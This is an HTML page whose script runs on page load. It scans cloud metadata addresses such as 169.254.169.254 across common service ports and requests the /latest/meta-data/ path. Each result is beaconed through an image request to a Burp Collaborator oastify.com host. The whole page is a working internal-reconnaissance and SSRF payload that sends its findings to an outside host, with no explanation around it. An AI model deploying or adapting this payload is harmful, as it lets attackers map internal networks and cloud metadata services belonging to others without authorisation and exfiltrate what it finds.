<!DOCTYPE html>
<html>
<head>
    <title>Port Scan and Ping Burp Collaborator</title>
    <script type="text/javascript">
        async function scanPort(host, port) {
            let statusCode = "open"; // Default to "open" if no error occurs
            try {
                let url = `http://${host}:${port}/latest/meta-data/`;
                let response = await fetch(url, { mode: 'no-cors' });
                if (response.type === 'opaque') {
                    console.log(`Port ${port} is open on ${host}, Status Code: opaque`);
                    sendPing(host, port, 'opaque');
                    return port;
                } else if (response.ok) {
                    console.log(`Port ${port} is open on ${host}, Status Code: 200`);
                    sendPing(host, port, '200');
                    return port;
                } else {
                    console.log(`Port ${port} is closed on ${host}`);
                    sendPing(host, port, 'closed');
                    return null;
                }
            } catch (error) {
                console.log(`Port ${port} is closed on ${host}, Error: ${error}`);
                sendPing(host, port, 'error');
                return null; // Port is closed or error occurred
            }
        }

        async function scanPorts(host, ports) {
            let openPorts = [];
            for (let port of ports) {
                let result = await scanPort(host, port);
                if (result) {
                    openPorts.push(result);
                }
            }
            return openPorts;
        }

        function sendPing(host, port, status) {
            let collaboratorUrl = 'https://dn4t8tvr4v4vh2gyzumgk6121t7kvbnzc.oastify.com';
            let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}&status=${status}`;
            let img = new Image();
            img.src = pingUrl;
            console.log(`Ping sent to ${pingUrl}`);
        }

        document.addEventListener("DOMContentLoaded", function() {
            let ips = [
                '169.254.169.254',
                '169.254.255.255',
                '169.254.0.0'
            ];

            let ports = [
                80, 443, 8080, 22, 21, 3306, 5432, 8443, 3389, 5900, 6379, 9200, 27017
            ]; // List of ports to scan

            ips.forEach(host => {
                scanPorts(host, ports).then(openPorts => {
                    console.log(`Open ports on ${host}:`, openPorts);
                });
            });
        });
    </script>
</head>
<body>
    <p>Scanning ports and pinging Burp Collaborator...</p>
</body>
</html>
